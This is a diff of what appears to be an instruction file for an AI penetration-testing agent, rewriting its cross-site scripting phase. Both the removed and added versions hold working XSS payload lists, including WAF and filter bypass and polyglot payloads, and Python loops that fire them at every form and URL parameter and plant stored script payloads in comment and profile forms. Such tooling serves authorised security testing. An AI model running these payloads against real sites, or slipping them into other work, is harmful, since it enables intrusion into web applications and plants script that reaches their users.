@@ -1511,315 +1511,250 @@ After compaction, read plan.md to see exactly where you left off.
       print('\n[Cookie Inject] Done')
   ```
 
-**Phase 5 — Input Validation (XSS)**
-  Test EVERY form input and URL parameter. NEVER report XSS without confirming the payload
-  appears UNESCAPED in the response.
+**Phase 5 — Cross-Site Scripting (XSS)**
 
-  RATE LIMITING — MANDATORY: add a delay between every payload request.
-  Sending payloads too fast triggers WAFs and rate limiters, causing false results.
-    import time
-    DELAY = 1.0   # seconds between each payload request — do NOT remove this
+  This phase tests EVERY form and EVERY URL parameter for reflected and stored XSS.
+  Run this as ONE complete run_python block. It iterates ALL forms automatically.
 
-  WAF/RATE-LIMIT DETECTION — check every response before concluding:
-    def check_waf(r, param, payload):
-        if r.status_code == 429:
-            print(f"[INFO] Rate limited (429) testing {param} — slow down, payload was blocked")
-            return True
-        if r.status_code in [403, 406, 503]:
-            body_lower = r.text.lower()
-            waf_signs = ['cloudflare', 'waf', 'firewall', 'blocked', 'forbidden',
-                         'access denied', 'mod_security', 'request rejected', 'barracuda']
-            if any(s in body_lower for s in waf_signs):
-                print(f"[INFO] WAF blocked request for {param} — cannot confirm XSS via automation")
-                return True
-        return False
+  ```python
+  import time, re
+  from urllib.parse import urljoin, urlparse, parse_qs
 
-  XSS PAYLOAD STRATEGY — TIERED APPROACH:
-    Use payloads in order: basic first, then context-aware, then filter bypass, then polyglots.
-    Stop on the FIRST confirmed hit per parameter (no need to test all if one works).
-    If basic payloads get encoded/stripped, try bypass payloads — the filter may be incomplete.
+  BASE    = _G['BASE']
+  session = _G.get('session_a') or _G.get('session')
+  AUTH_FORMS  = _G.get('AUTH_FORMS', [])
+  ALL_FORMS   = _G.get('ALL_FORMS', [])
+  AUTH_PARAMS = _G.get('AUTH_PARAMS', [])
+  DELAY = 0.5
 
-    ```python
-    # ── TIER 1: Basic payloads — test these first ──────────────────────────────
-    BASIC_XSS = [
-        '''<script>alert(1)</script>''',
-        '''<img src=x onerror=alert(1)>''',
-        '''<svg onload=alert(1)>''',
-    ]
+  # ── XSS Payloads (tiered: basic → context → bypass → polyglot) ─────────────
+  BASIC_XSS = [
+      '<script>alert(1)</script>',
+      '<img src=x onerror=alert(1)>',
+      '<svg onload=alert(1)>',
+  ]
+  CONTEXT_XSS = [
+      '"><script>alert(1)</script>',
+      "'><script>alert(1)</script>",
+      '"><img src=x onerror=alert(1)>',
+      '" onfocus=alert(1) autofocus="',
+      '</textarea><script>alert(1)</script>',
+      '</title><script>alert(1)</script>',
+      'javascript:alert(1)',
+  ]
+  BYPASS_XSS = [
+      '<ScRiPt>alert(1)</ScRiPt>',
+      '<img src=x onerror=alert`1`>',
+      '<svg/onload=alert(1)>',
+      '<details open ontoggle=alert(1)>',
+      '<input onfocus=alert(1) autofocus>',
+      '<iframe src="javascript:alert(1)">',
+      '<body onload=alert(1)>',
+      '<img/src="x"/onerror=alert(1)>',
+  ]
+  POLYGLOT_XSS = [
+      "'-alert(1)-'",
+      '</script><svg onload=alert(1)>',
+      '<img src=x onerror="javascript:alert(1)">',
+  ]
+  ALL_XSS = BASIC_XSS + CONTEXT_XSS + BYPASS_XSS + POLYGLOT_XSS
 
-    # ── TIER 2: Context-breaking payloads — break out of HTML attributes/tags ──
-    CONTEXT_XSS = [
-        '"><script>alert(1)</script>',                  # break out of attribute with ">
-        "'><script>alert(1)</script>",                  # break out with '>
-        '"><img src=x onerror=alert(1)>',               # attribute breakout + event
-        '" onfocus=alert(1) autofocus="',                # inject event into existing tag
-        '" onmouseover=alert(1) "',                      # hover event injection
-        '</title><script>alert(1)</script>',             # break out of <title> tag
-        '</textarea><script>alert(1)</script>',          # break out of <textarea>
-        '</script><script>alert(1)</script>',            # break out of <script> block
-        'javascript:alert(1)',                           # href/src context
-        'data:text/html,<script>alert(1)</script>',     # data: URI context
-    ]
+  def check_waf(r):
+      if r.status_code == 429:
+          return True
+      if r.status_code in (403, 406, 503):
+          waf = ['cloudflare','waf','firewall','blocked','forbidden','mod_security']
+          if any(w in r.text.lower() for w in waf):
+              return True
+      return False
 
-    # ── TIER 3: Filter bypass payloads — WAF/blacklist evasion ─────────────────
-    BYPASS_XSS = [
-        '''<ScRiPt>alert(1)</ScRiPt>''',               # mixed case bypass
-        '''<scr<script>ipt>alert(1)</scr</script>ipt>''',  # recursive filter bypass
-        '''<img src=x onerror=alert`1`>''',             # backtick instead of parentheses
-        '''<svg/onload=alert(1)>''',                    # slash instead of space
-        '''<svg\tonload=alert(1)>''',                   # tab instead of space
-        '''<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>''',  # HTML entity encoding
-        '''<img src=x onerror=al\\u0065rt(1)>''',       # unicode escape in JS
-        '''<iframe src="javascript:alert(1)">''',       # iframe javascript: URI
-        '''<body onload=alert(1)>''',                   # body event handler
-        '''<input onfocus=alert(1) autofocus>''',        # autofocus trigger
-        '''<details open ontoggle=alert(1)>''',          # details/summary event
-        '''<marquee onstart=alert(1)>''',                # marquee event
-        '''<video src=x onerror=alert(1)>''',            # video error event
-        '''<audio src=x onerror=alert(1)>''',            # audio error event
-        '''<object data="javascript:alert(1)">''',       # object javascript: URI
-        '''<isindex action=javascript:alert(1) type=image>''',
-        '''<img src=x:alert onerror=eval(src)>''',       # eval-based
-        '''<img/src="x"/onerror=alert(1)>''',            # no space, slash-separated
-        '''<svg><animate onbegin=alert(1) attributeName=x dur=1s>''',  # SVG animate
-        '''<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">''',  # math + style breakout
-    ]
+  xss_findings = []
 
-    # ── TIER 4: Polyglot payloads — work in multiple contexts at once ──────────
-    POLYGLOT_XSS = [
-        'jaVasCript:/*-/*`/*\\\\`/*\\'/*"/**/(/* */oNcliCk=alert() )//',
-        'javascript:"/*\\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=alert()//>',
-        "'-alert(1)-'",                                  # JS string context break
-        "\\\\'- alert(1)//",                              # escaped quote context
-        '</script><svg onload=alert(1)>',                # script block breakout
-        '<img src=x onerror="javascript:alert(1)">',    # full handler
-    ]
+  # ═══════════════════════════════════════════════════════════════════
+  # PART A — REFLECTED XSS: Test every form field
+  # ═══════════════════════════════════════════════════════════════════
+  all_forms = AUTH_FORMS + ALL_FORMS
+  print(f"[XSS] Testing {len(all_forms)} forms for reflected XSS")
 
-    # Combine in order — stop at first confirmed hit
-    ALL_XSS_PAYLOADS = BASIC_XSS + CONTEXT_XSS + BYPASS_XSS + POLYGLOT_XSS
-    ```
+  for form in all_forms:
+      action = form.get('action', BASE)
+      method = form.get('method', 'get').lower()
+      fields = form.get('fields', [])
+      url = action if action.startswith('http') else urljoin(BASE, action)
 
-  XSS TESTING APPROACH:
-    1. Start with BASIC_XSS — if payload reflects unescaped, CONFIRMED
-    2. If BASIC gets encoded → try CONTEXT_XSS (maybe you're inside an attribute/tag)
-    3. If CONTEXT gets blocked → try BYPASS_XSS (filter evasion, encoding tricks)
-    4. If still blocked → try POLYGLOT_XSS (multi-context, last resort)
-    5. If ALL blocked → report as [INFO] "Input reflected but properly sanitized"
+      text_fields = [f for f in fields
+                     if f.get('type', 'text') not in ('submit','hidden','checkbox','radio','file','button')]
+      if not text_fields:
+          continue
 
-  CONTEXT DETECTION — check WHERE your input lands before choosing payloads:
-    ```python
-    # Send a harmless probe first to detect reflection context
-    PROBE = 'xSs_PrObE_7x7'
-    r = session.get(url, params={param_name: PROBE})
-    body = r.text
+      print(f"\n  Form: {method.upper()} {url}  fields={[f['name'] for f in text_fields]}")
 
-    if PROBE not in body:
-        print(f"[INFO] {param_name}: input not reflected at all — skip")
-    else:
-        idx = body.find(PROBE)
-        context = body[max(0,idx-80):idx+80]
-        print(f"  Reflection context: ...{context}...")
+      for field in text_fields:
+          fname = field['name']
 
-        # Determine context type and pick appropriate payloads
-        before = body[max(0,idx-40):idx]
-        if 'value="' in before or "value='" in before:
-            print("  → INPUT ATTRIBUTE context — need attribute breakout payloads")
-            payloads = CONTEXT_XSS + BYPASS_XSS + POLYGLOT_XSS
-        elif '<script' in before.lower():
-            print("  → JAVASCRIPT context — need JS string breakout")
-            payloads = ["'-alert(1)-'", "\\'-alert(1)//", "</script><svg onload=alert(1)>"]
-        elif '<textarea' in before.lower() or '<title' in before.lower():
-            print("  → TAG CONTENT context — need tag breakout first")
-            payloads = ["</textarea><script>alert(1)</script>", "</title><script>alert(1)</script>"]
-        elif 'href=' in before.lower() or 'src=' in before.lower():
-            print("  → URL ATTRIBUTE context — try javascript: URI")
-            payloads = ["javascript:alert(1)", "data:text/html,<script>alert(1)</script>"]
-        else:
-            print("  → HTML BODY context — use all payloads")
-            payloads = ALL_XSS_PAYLOADS
-    ```
+          # Step 1: Probe — does the input get reflected at all?
+          probe = 'xSsProBe7x7q'
+          data_probe = {f['name']: f.get('value', '') or 'test' for f in fields}
+          data_probe[fname] = probe
+          try:
+              if method == 'post':
+                  r_probe = session.post(url, data=data_probe, timeout=10, allow_redirects=True)
+              else:
+                  r_probe = session.get(url, params=data_probe, timeout=10, allow_redirects=True)
+          except Exception:
+              continue
 
-  XSS CONFIRMATION LOOP (with context-aware detection):
-    for payload in payloads:
-        time.sleep(DELAY)
-        r = session.get(url, params={param_name: payload})
+          if probe not in r_probe.text:
+              print(f"    {fname}: not reflected — skip")
+              continue
 
-        if check_waf(r, param_name, payload):
-            break
+          # Detect context
+          idx = r_probe.text.find(probe)
+          before = r_probe.text[max(0,idx-50):idx]
+          if 'value="' in before or "value='" in before:
+              payloads = CONTEXT_XSS + BYPASS_XSS + POLYGLOT_XSS
+              ctx = 'ATTRIBUTE'
+          elif '<script' in before.lower():
+              payloads = ["'-alert(1)-'", "</script><svg onload=alert(1)>"]
+              ctx = 'SCRIPT'
+          else:
+              payloads = ALL_XSS
+              ctx = 'HTML_BODY'
+          print(f"    {fname}: REFLECTED in {ctx} context — testing {len(payloads)} payloads")
 
-        body = r.text
-        # Confirmed only if payload appears LITERALLY unescaped:
-        if payload in body:
-            print(f"[HIGH] Reflected XSS CONFIRMED in {param_name}!")
-            idx = body.find(payload[:20])
-            print("Context:", body[max(0,idx-100):idx+150])
-            print(f"Payload: {payload}")
-            # AFTER confirming: take a browser screenshot for visual proof!
-            # browser_action(action="navigate", url=r.url)
-            # browser_action(action="screenshot", filename=f"xss_proof_{param_name}.png")
-            break
-        elif '&lt;script&gt;' in body or '&#60;' in body or '&lt;img' in body:
-            print(f"[INFO] {param_name}: payload HTML-encoded — trying next tier...")
-            continue   # don't stop — try bypass payloads
-        elif payload.replace('<','').replace('>','') in body:
-            print(f"[INFO] {param_name}: angle brackets stripped — trying bypass payloads...")
-            continue   # don't stop — try encoded/polyglot versions
-        else:
-            print(f"[INFO] {param_name}: payload not reflected")
+          # Step 2: Test payloads
+          confirmed = False
+          for payload in payloads:
+              time.sleep(DELAY)
+              data = {f['name']: f.get('value', '') or 'test' for f in fields}
+              data[fname] = payload
+              try:
+                  if method == 'post':
+                      r = session.post(url, data=data, timeout=10, allow_redirects=True)
+                  else:
+                      r = session.get(url, params=data, timeout=10, allow_redirects=True)
+              except Exception:
+                  continue
+              if check_waf(r):
+                  print(f"    {fname}: WAF blocked — stopping")
+                  break
 
-  IMPORTANT — test EVERY form from AUTH_FORMS, not just the login form:
-    ```python
-    import time
-    from urllib.parse import urljoin
+              if payload in r.text:
+                  print(f"[HIGH] Reflected XSS CONFIRMED: {url} param={fname}")
+                  print(f"  Payload: {payload}")
+                  pi = r.text.find(payload[:15])
+                  print(f"  Context: ...{r.text[max(0,pi-80):pi+120]}...")
+                  xss_findings.append({
+                      'type': 'reflected', 'url': url, 'param': fname,
+                      'payload': payload, 'method': method.upper(),
+                      'evidence': r.text[max(0,pi-80):pi+200],
+                  })
+                  confirmed = True
+                  break
+              elif '&lt;script&gt;' in r.text or '&lt;img' in r.text:
+                  continue  # encoded, try next payload
+          if not confirmed:
+              print(f"    {fname}: all payloads filtered/encoded")
 
-    BASE    = _G['BASE']
-    session = _G['session']
-    AUTH_FORMS = _G.get('AUTH_FORMS', [])
-    DELAY = 0.8
+  # ═══════════════════════════════════════════════════════════════════
+  # PART B — REFLECTED XSS: Test URL parameters from crawl
+  # ═══════════════════════════════════════════════════════════════════
+  print(f"\n[XSS] Testing {len(AUTH_PARAMS)} URL parameters for reflected XSS")
 
-    # Use the tiered payload lists defined above (BASIC_XSS, CONTEXT_XSS, BYPASS_XSS, POLYGLOT_XSS)
-    # Start with basic, escalate to bypass/polyglot if basic gets filtered
+  for param_info in AUTH_PARAMS:
+      purl = param_info['url'].split('?')[0]
+      pname = param_info['param']
 
-    def check_reflected(body, payload):
-        if payload in body:
-            return 'REFLECTED'
-        if '&lt;script&gt;' in body or '&lt;img' in body or '&#60;' in body:
-            return 'ENCODED'
-        if payload.replace('<','').replace('>','') in body:
-            return 'STRIPPED'
-        return 'NOT_REFLECTED'
+      probe = 'xSsProBe7x7q'
+      try:
+          r_probe = session.get(purl, params={pname: probe}, timeout=10)
+      except Exception:
+          continue
+      if probe not in r_probe.text:
+          continue
 
-    for form in AUTH_FORMS:
-        method  = form['method']
-        action  = form['action']
-        fields  = form['fields']
-        print(f"\n--- Testing form: {method.upper()} {action} ---")
-        text_fields = [f for f in fields if f['type'] not in ('submit','checkbox','radio','hidden','file')]
-        if not text_fields:
-            print("  No text inputs to test — skip")
-            continue
-        for field in text_fields:
-            fname = field['name']
-            confirmed = False
-            # Start with basic, escalate if filtered
-            for tier_name, tier_payloads in [('BASIC', BASIC_XSS), ('CONTEXT', CONTEXT_XSS),
-                                              ('BYPASS', BYPASS_XSS), ('POLYGLOT', POLYGLOT_XSS)]:
-                if confirmed:
-                    break
-                for payload in tier_payloads:
-                    data = {f['name']: f['value'] or 'test' for f in fields}
-                    data[fname] = payload
-                    time.sleep(DELAY)
-                    try:
-                        if method == 'post':
-                            r = session.post(action, data=data, timeout=10, allow_redirects=True)
-                        else:
-                            r = session.get(action, params=data, timeout=10, allow_redirects=True)
-                    except Exception as e:
-                        print(f"  Error: {e}")
-                        break
-                    if check_waf(r, fname, payload):
-                        break
-                    result = check_reflected(r.text, payload)
-                    print(f"  [{tier_name}] {fname}={payload[:40]}... → {result}")
-                    if result == 'REFLECTED':
-                        print(f"[HIGH] Reflected XSS CONFIRMED: {action} param={fname}")
-                        print(f"  Payload: {payload}")
-                        idx = r.text.find(payload[:15])
-                        print("Context:", r.text[max(0,idx-80):idx+120])
-                        # Screenshot proof via browser_action after this run_python block
-                        confirmed = True
-                        break
-                    elif result == 'ENCODED':
-                        print(f"  {fname}: encoded — escalating to {tier_name} bypass payloads...")
-                        break  # move to next tier
-                    elif result == 'STRIPPED':
-                        print(f"  {fname}: stripped — escalating to {tier_name} bypass payloads...")
-                        break  # move to next tier
-    ```
+      print(f"  {purl} ?{pname}= REFLECTED — testing payloads")
+      for payload in ALL_XSS:
+          time.sleep(DELAY)
+          try:
+              r = session.get(purl, params={pname: payload}, timeout=10)
+          except Exception:
+              continue
+          if check_waf(r):
+              break
+          if payload in r.text:
+              print(f"[HIGH] Reflected XSS: {purl} ?{pname}=")
+              print(f"  Payload: {payload}")
+              xss_findings.append({
+                  'type': 'reflected', 'url': purl, 'param': pname,
+                  'payload': payload, 'method': 'GET',
+              })
+              break
 
-  ───────────────────────────────────────────────────────
-  STORED XSS PROTOCOL (mandatory for comment/message/profile forms)
-  ───────────────────────────────────────────────────────
-  Stored XSS is different from reflected XSS:
-    - You POST a payload to a form (e.g. comment body, username, bio)
-    - The payload is SAVED in the database
-    - The XSS fires when ANOTHER page LOADS the stored content
-    - You MUST fetch the display page AFTER submitting and check if the payload is unescaped
+  # ═══════════════════════════════════════════════════════════════════
+  # PART C — STORED XSS: Test POST forms that store data
+  # ═══════════════════════════════════════════════════════════════════
+  STORED_KW = ['comment','message','note','post','profile','bio','settings',
+               'register','review','feedback','contact','announce','content']
+  stored_forms = [f for f in all_forms
+                  if f.get('method','get').lower() == 'post'
+                  and any(kw in f.get('action','').lower() or kw in f.get('page','').lower()
+                          for kw in STORED_KW)]
 
-  How to identify stored XSS candidates:
-    - Forms that POST to /comment, /post, /message, /note, /profile, /settings, /register
-    - Forms where the submitted text gets displayed back on another page
+  print(f"\n[XSS] Testing {len(stored_forms)} forms for stored XSS")
+  STORED_PAYLOAD = '<script>alert("STORED_XSS_PROOF")</script>'
+  MARKER = 'STORED_XSS_PROOF'
 
-  Stored XSS confirmation code:
-    ```python
-    import time
-    from bs4 import BeautifulSoup
+  for form in stored_forms:
+      action = form['action']
+      page = form.get('page', action)
+      fields = form.get('fields', [])
+      text_fields = [f for f in fields
+                     if f.get('type','text') not in ('submit','hidden','file','checkbox','radio','button')]
+      if not text_fields:
+          continue
 
-    BASE    = _G['BASE']
-    session = _G['session']
+      print(f"  Stored XSS: POST {action} → display: {page}")
 
-    STORED_PAYLOAD = '<script>alert("STORED_XSS")</script>'
-    # Use a unique marker so we can find it in the display page
-    MARKER = 'STORED_XSS'
+      for field in text_fields:
+          fname = field['name']
+          data = {f['name']: f.get('value', '') or 'test' for f in fields}
+          data[fname] = STORED_PAYLOAD
+          try:
+              session.post(action, data=data, timeout=10, allow_redirects=True)
+              time.sleep(0.5)
+              r_disp = session.get(page, timeout=10, allow_redirects=True)
+          except Exception:
+              continue
 
-    # For each form that might store data (identified from AUTH_FORMS):
-    # Example: comments form at /comments with field 'comment'
+          if STORED_PAYLOAD in r_disp.text:
+              print(f"[HIGH] Stored XSS CONFIRMED: {action} field={fname}")
+              print(f"  Payload renders unescaped on: {page}")
+              xss_findings.append({
+                  'type': 'stored', 'url': action, 'param': fname,
+                  'payload': STORED_PAYLOAD, 'display_page': page,
+              })
+              break
+          elif MARKER in r_disp.text and '&lt;script&gt;' not in r_disp.text:
+              print(f"[HIGH] Stored XSS CONFIRMED (marker present): {fname}")
+              xss_findings.append({
+                  'type': 'stored', 'url': action, 'param': fname,
+                  'payload': STORED_PAYLOAD, 'display_page': page,
+              })
+              break
+          elif '&lt;script&gt;' in r_disp.text and MARKER in r_disp.text:
+              print(f"  {fname}: stored but HTML-encoded — NOT vulnerable")
+          else:
+              print(f"  {fname}: payload not found on display page")
 
-    AUTH_FORMS = _G.get('AUTH_FORMS', [])
-    stored_candidates = [
-        f for f in AUTH_FORMS
-        if any(kw in f['action'].lower() or kw in f['page'].lower()
-               for kw in ['comment','message','note','post','profile','bio','settings','register'])
-        and f['method'] == 'post'
-    ]
-
-    print(f"Stored XSS candidates: {len(stored_candidates)}")
-    for form in stored_candidates:
-        action = form['action']
-        page   = form['page']
-        fields = form['fields']
-        print(f"\n  Testing stored XSS: POST {action}  (displayed on: {page})")
-
-        for field in fields:
-            if field['type'] in ('submit', 'hidden', 'file', 'checkbox', 'radio'):
-                continue
-            fname = field['name']
-            # Step 1: submit the payload
-            data = {f['name']: f['value'] or 'test' for f in fields}
-            data[fname] = STORED_PAYLOAD
-            try:
-                r_post = session.post(action, data=data, timeout=10, allow_redirects=True)
-                print(f"  Submitted payload to {fname} → status {r_post.status_code}")
-            except Exception as e:
-                print(f"  POST error: {e}")
-                continue
-
-            # Step 2: fetch the display page (the page where this content is rendered)
-            time.sleep(0.5)
-            try:
-                r_display = session.get(page, timeout=10, allow_redirects=True)
-                body = r_display.text
-            except Exception as e:
-                print(f"  GET display error: {e}")
-                continue
-
-            # Step 3: check if payload is unescaped in the display page
-            if STORED_PAYLOAD in body:
-                print(f"[HIGH] Stored XSS CONFIRMED! Field '{fname}' on form {action}")
-                print(f"       Payload appears unescaped on: {page}")
-                idx = body.find(STORED_PAYLOAD[:20])
-                print("Context:", body[max(0,idx-80):idx+150])
-            elif MARKER in body and '&lt;script&gt;' not in body:
-                print(f"[HIGH] Stored XSS CONFIRMED (script tag present, marker found): {fname}")
-            elif '&lt;script&gt;' in body and MARKER in body:
-                print(f"[INFO] {fname}: stored but HTML-encoded — properly escaped, NOT stored XSS")
-            elif MARKER not in body:
-                print(f"[INFO] {fname}: marker not found on display page — payload stripped or not stored")
-            else:
-                print(f"[INFO] {fname}: ambiguous result — manual check recommended")
-                print("Display page snippet:", body[:400])
-    ```
+  # ═══════════════════════════════════════════════════════════════════
+  # SUMMARY
+  # ═══════════════════════════════════════════════════════════════════
+  print(f"\n=== XSS SUMMARY: {len(xss_findings)} confirmed ===")
+  for f in xss_findings:
+      print(f"  [{f['type'].upper()}] {f.get('method','POST')} {f['url']} — {f['param']}: {f['payload'][:50]}")
+  _G['XSS_FINDINGS'] = xss_findings
+  ```
 
 **Phase 6 — SQL Injection**
 
